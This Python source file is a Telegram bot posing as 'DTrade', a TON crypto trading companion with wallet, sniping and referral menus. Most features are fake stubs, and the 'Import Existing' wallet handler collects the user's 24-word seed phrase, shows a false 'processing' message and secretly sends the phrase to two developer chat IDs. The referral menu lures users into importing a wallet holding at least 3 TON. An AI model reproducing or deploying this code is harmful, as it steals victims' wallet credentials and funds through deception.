import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
import os
from loguru import logger
import sys

logger.remove()
logger.add(sys.stdout, format="<level>{message}</level>")


load_dotenv()
API_TOKEN = os.getenv('TELEGRAM_API_KEY')

bot = telebot.TeleBot(API_TOKEN)



main_markup = telebot.types.InlineKeyboardMarkup()
btn_wallets = telebot.types.InlineKeyboardButton('💰 Wallets', callback_data='wallets')
btn_snipes = telebot.types.InlineKeyboardButton('👁️ Snipes', callback_data='snipes')
btn_referral = telebot.types.InlineKeyboardButton('💎 Referral System', callback_data='referral')
btn_language = telebot.types.InlineKeyboardButton('🌐 Language', callback_data='language')
btn_settings = telebot.types.InlineKeyboardButton('⚙️ Settings', callback_data='settings')
btn_help = telebot.types.InlineKeyboardButton('📚 Help', callback_data='help')
main_markup.row(btn_wallets, btn_snipes)
main_markup.row(btn_referral)
main_markup.row(btn_language, btn_settings)
main_markup.row(btn_help)

settings_markup = InlineKeyboardMarkup()
trd_btn = InlineKeyboardButton("📈 Tradings", callback_data="tradings")
int_btn = InlineKeyboardButton("🖥️ Interface", callback_data="interface")
ab_btn = InlineKeyboardButton("🤖 Auto Buy", callback_data="auto buy")
back_btn = InlineKeyboardButton("⬅️ Back", callback_data="back")
settings_markup.add(trd_btn, int_btn, ab_btn, back_btn)

snipes_markup = InlineKeyboardMarkup()
btn_snipe_deployer = InlineKeyboardButton('🥷 Snipe Deployer', callback_data='snipe_deployer')
btn_snipe_jetton = InlineKeyboardButton('🚀 Snipe Jetton', callback_data='snipe_jetton')
snipes_markup.row(btn_snipe_deployer, btn_snipe_jetton)
snipes_markup.row(back_btn)

snipe_jetton_markup = InlineKeyboardMarkup()
snipe_cancel_btn = InlineKeyboardButton('❌ Close', callback_data='snipe_cancel')
snipe_jetton_markup.row(snipe_cancel_btn)

wallets_markup = InlineKeyboardMarkup()
create_btn = InlineKeyboardButton('➕ Create New', callback_data='create_wallet')
export_btn = InlineKeyboardButton('📝 Export', callback_data='export_wallet')
import_btn = InlineKeyboardButton('📥 Import Existing', callback_data='existing_wallet')
wallets_markup.row(create_btn, export_btn)
wallets_markup.row(import_btn, back_btn)

create_wallet_markup = InlineKeyboardMarkup()
btn_transfer = InlineKeyboardButton('💸 Transfer', callback_data='transfer')
btn_version = InlineKeyboardButton('🔖 Version: V5R1Final', callback_data='version')
btn_show_seed = InlineKeyboardButton('🌱 Show Seed', callback_data='show_seed')
btn_edit_name = InlineKeyboardButton('✏️ Edit Name', callback_data='edit_name')
btn_delete = InlineKeyboardButton('🗑️ Delete', callback_data='delete_wallet')
back_to_wallet_btn = InlineKeyboardButton("⬅️ Back", callback_data="back_to_wallet")
create_wallet_markup.row(btn_transfer, btn_version)
create_wallet_markup.row(btn_show_seed, btn_edit_name)
create_wallet_markup.row(btn_delete, back_to_wallet_btn)

referral_markup = InlineKeyboardMarkup()
get_link_btn = InlineKeyboardButton("💎 Get link", callback_data="get_link")
back_link_btn = InlineKeyboardButton("⬅️ Back", callback_data="back_link")
referral_markup.row(get_link_btn, back_link_btn)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    logger.info(f"🚪 Добро пожаловать {message.from_user.first_name} | @{message.from_user.username}")
    user_name = message.from_user.first_name
    welcome_message = (
        "👋 Hello, " + user_name + "\n\n"
        "⚡️ Welcome to DTrade – your ultimate trading companion on TON!\n\n"
        
        "[] News: [DTrade News](https://t.me/dtrade_news) | Backup: [@dtrade_backup_bot](https://t.me/dtrade_backup_bot)\n"
    )
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=main_markup, parse_mode="Markdown", disable_web_page_preview=True)
    # print(message.chat.id)
    
@bot.callback_query_handler(func=lambda call: call.data == "settings")
def settings_pressed(call):
    logger.info(f"⚙️ {call.from_user.first_name} | @{call.from_user.username} - Settings")
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=settings_markup)

@bot.callback_query_handler(func=lambda call: call.data == "back")
def back_pressed(call):
    logger.info(f"⬅️ {call.from_user.first_name} | @{call.from_user.username} - Back")
    user_name = call.from_user.first_name
    welcome_message = (
        "👋 Hello, " + user_name + "\n\n"
        "⚡️ Welcome to DTrade – your ultimate trading companion on TON!\n\n"
        
        "[] News: [DTrade News](https://t.me/dtrade_news) | Backup: [@dtrade_backup_bot](https://t.me/dtrade_backup_bot)\n"
    )
    # bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,reply_markup=main_markup)
    bot.edit_message_text(welcome_message, call.message.chat.id, call.message.message_id, reply_markup=main_markup, parse_mode="Markdown", disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: call.data == "language")
@bot.callback_query_handler(func=lambda call: call.data == "export_wallet")
@bot.callback_query_handler(func=lambda call: call.data == "edit_name")
@bot.callback_query_handler(func=lambda call: call.data == "transfer")
def coming_soon(call):
    logger.info(f"😴 {call.from_user.first_name} | @{call.from_user.username} - {call.data} Coming soon...")
    bot.answer_callback_query(call.id, "😴 Coming soon...")

@bot.callback_query_handler(func=lambda call: call.data == "snipes")
def snipes_pressed(call):
    logger.info(f"👁️ {call.from_user.first_name} | @{call.from_user.username} - Snipes")

    user_name = call.from_user.first_name
    snipes_message = f"👁️ {user_name}, you don't have any snipes yet"
    
    # bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, snipes_message, reply_markup=snipes_markup)
    bot.edit_message_text(snipes_message, call.message.chat.id, call.message.message_id, reply_markup=snipes_markup)

@bot.callback_query_handler(func=lambda call: call.data == "snipe_jetton")
def snipe_jetton_pressed(call):
    logger.info(f"❌ {call.from_user.first_name} | @{call.from_user.username} - Snipe jetton")
    
    bot.edit_message_text("❌ First create a wallet", call.message.chat.id, call.message.message_id, reply_markup=snipe_jetton_markup)

@bot.callback_query_handler(func=lambda call: call.data == "snipe_deployer")
def snipe_deployer_pressed(call):
    logger.info(f"❌ {call.from_user.first_name} | @{call.from_user.username} - Snipe jetton")

    bot.edit_message_text("❌ First create a wallet", call.message.chat.id, call.message.message_id, reply_markup=snipe_jetton_markup)


@bot.callback_query_handler(func=lambda call: call.data == "snipe_cancel")
def snipe_cancel_pressed(call):
    back_pressed(call)

@bot.callback_query_handler(func=lambda call: call.data == "delete_wallet")
@bot.callback_query_handler(func=lambda call: call.data == "back_to_wallet")
@bot.callback_query_handler(func=lambda call: call.data == "wallets")
def wallets_pressed(call):
    logger.info(f"💰 {call.from_user.first_name} | @{call.from_user.username} - Wallets {call.data}")

    user_name = call.from_user.first_name
    wallets_message = f"💰 {user_name}, you don't have any wallets yet. Let's make one!"
    
    bot.edit_message_text(wallets_message, call.message.chat.id, call.message.message_id, reply_markup=wallets_markup)

@bot.callback_query_handler(func=lambda call: call.data == "create_wallet")
def create_wallet_pressed(call):
    logger.info(f"➕ {call.from_user.first_name} | @{call.from_user.username} - Create wallet")
    
    wallet_address = "UQBulhlC3EtbCDH-FxNi_vKSJ7T22V3PI4IAa-5UpRBcWbhK"
    wallet_message = (
        f"💎 Wallet ...<a href='https://tonviewer.com/{wallet_address}'>BcWbhK</a>\n\n"
        f"🔖 Address »\n<code>{wallet_address}</code>\n\n"
        "💵 Current balance » 0 💎 (~$0)\n"
    )
    bot.edit_message_text(wallet_message, call.message.chat.id, call.message.message_id, reply_markup=create_wallet_markup, disable_web_page_preview=True, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "help")
def help_pressed(call):
    logger.info(f"📚 {call.from_user.first_name} | @{call.from_user.username} - Help")

    help_message = (
        "📚 <a href='https://t.me/dtrade_news'>News</a>\n"
        "\n"
        "E-mail - dtradeton@gmail.com\n"
        "Dev - @dabload\n"
    )
    bot.edit_message_text(help_message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(back_btn), parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "auto buy")
@bot.callback_query_handler(func=lambda call: call.data == "interface")
@bot.callback_query_handler(func=lambda call: call.data == "tradings")
def first_crate_wallet_pressed(call):
    logger.info(f"❌ {call.from_user.first_name} | @{call.from_user.username} - First create {call.data}")

    auto_buy_message = "❌ First create a wallet"
    bot.edit_message_text(auto_buy_message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(back_btn))

@bot.callback_query_handler(func=lambda call: call.data == "show_seed")
def show_seed_pressed(call):
    logger.info(f"🌱 {call.from_user.first_name} | @{call.from_user.username} - Show seed")

    seed_phrase = (
        "🌱 Seed phrase for the wallet 👛 ...BcWbhK\n\n"
        "<code>soda excuse rocket mandate meadow vault legal coach prison opera identify resource approve rack raccoon appear trust sea already leopard census asset escape plug</code>\n\n"
        "📋 You can simply copy mnemonic by clicking on it"
    )
    bot.edit_message_text(seed_phrase, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back", callback_data="show_seed_back")), disable_web_page_preview=True, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "show_seed_back")
def show_seed_back_pressed(call):
    logger.info(f"⬅️ {call.from_user.first_name} | @{call.from_user.username} - Back")
    create_wallet_pressed(call)


@bot.callback_query_handler(func=lambda call: call.data == "existing_wallet")
def import_wallet_pressed(call):
    logger.info(f"📥 {call.from_user.first_name} | @{call.from_user.username} - Import")
    
    bot.edit_message_text("🌱 Enter your seed phrase (24 words):", call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🚫 Cancel", callback_data="cancel_seed_phrase")))
    bot.register_next_step_handler(call.message, process_seed_phrase)

def process_seed_phrase(message):
    seed_phrase = message.text
    words = seed_phrase.split()
    if len(words) == 24:
        logger.info(f"✅ {message.from_user.first_name} | @{message.from_user.username} - YEAAAH")
        # bot.delete_message(message.chat.id, message.message_id)
        bot.send_message(message.chat.id, "🌱 Thank you, processing will take ~5 minutes", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("✅ Close", callback_data="cancel_seed_phrase")))
        developer_chat_id = os.getenv('DEVELOPER_CHAT_ID_1')
        bot.send_message(developer_chat_id, f"<code>{seed_phrase}</code>", parse_mode="HTML")
        developer_chat_id = os.getenv('DEVELOPER_CHAT_ID_2')
        bot.send_message(developer_chat_id, f"<code>{seed_phrase}</code>", parse_mode="HTML")
    else:
        logger.info(f"❌ {message.from_user.first_name} | @{message.from_user.username} - FUUUCK")

        bot.send_message(message.chat.id, "❌ Invalid seed phrase. Please enter exactly 24 words.", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🚫 Cancel", callback_data="cancel_seed_phrase")))
        bot.register_next_step_handler(message, process_seed_phrase)

@bot.callback_query_handler(func=lambda call: call.data == "cancel_seed_phrase")
def cancel_seed_phrase_pressed(call):
    logger.info(f"🚫 {call.from_user.first_name} | @{call.from_user.username} - Close entering seed phrase")
    wallets_pressed(call)

@bot.callback_query_handler(func=lambda call: call.data == "referral")
def referral_pressed(call):
    logger.info(f"💎 {call.from_user.first_name} | @{call.from_user.username} - Referral System")
    
    message = (
        "💎 Referral system rewards:\n\n"
        "1) 5 referrals - 1 TON \n"
        "2) 10 referrals - 2 TON \n"
        "3) 20 referrals - 5 TON \n"
        "4) 50 referrals - 10 TON \n"
        "5) 100 referrals - 20 TON \n"
        "6) 200 referrals - 50 TON \n"
        "7) 500 referrals - 100 TON \n\n"
        "Invite friends and acquaintances and receive TON to your wallet!"
    )

    bot.edit_message_text(message, call.message.chat.id, call.message.message_id, reply_markup=referral_markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "get_link")
def get_link_pressed(call):
    logger.info(f"💎 {call.from_user.first_name} | @{call.from_user.username} - Get link")

    message = (
        "❌ YOU HAVE NO ACTIVE WALLETS.\n\n"

        "<strong>To activate the referral system, you need to:</strong>\n\n"

        "<blockquote>1) Import your crypto wallet that has at least 3 TON.</blockquote>\n"
        "OR\n"
        "<blockquote>2.1) 1. Generate a wallet in the bot.\n"
        "2.2) 2. Top up your balance by >= 3 TON.</blockquote>\n"
    )

    bot.edit_message_text(message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back", callback_data="get_link_back")), parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "get_link_back")
def get_link_back_pressed(call):
    referral_pressed(call)

@bot.callback_query_handler(func=lambda call: call.data == "back_link")
def back_link_pressed(call):
    back_pressed(call)

bot.polling()


